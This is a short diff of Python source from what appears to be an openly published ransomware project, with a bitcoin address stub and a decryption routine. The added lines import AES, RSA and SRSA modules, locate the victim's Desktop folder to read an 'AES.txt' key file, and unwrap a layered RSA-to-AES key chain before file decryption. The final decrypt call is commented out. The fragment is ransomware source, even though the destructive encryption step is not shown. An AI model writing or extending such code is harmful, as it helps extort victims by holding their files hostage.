@@ -3,6 +3,9 @@
 # by Tarcisio marinho
 # github.com/tarcisio-marinho
 import os, socket
+from AES import *
+from RSA import *
+from SRSA import *
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
@@ -36,16 +39,23 @@ def bitcoin_addr():
     pass
 
 def decrypt_all():
+    caminho = os.environ['HOME']+'/Desktop/'
+    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    if(os.path.isdir(caminho)):
+        caminho_correto = caminho
+    elif(os.path.isdir(caminho2)):
+        caminho_correto = caminho2
+
     SRSA_to_RSA()
     print('[*] chave privada do cliente descriptografada')
     RSA_to_AES()
     print('[*] chave AES descriptografada')
-
     f = open(caminho_correto + 'AES.txt','r')
     a = f.read()
     tam = len(a)
     if(tam == 30):
-        decrypt()
+        #decrypt()
+        pass
 
 def decrypt(diretorio):
     for caminho, diretorio, arquivo in os.walk(diretorio):
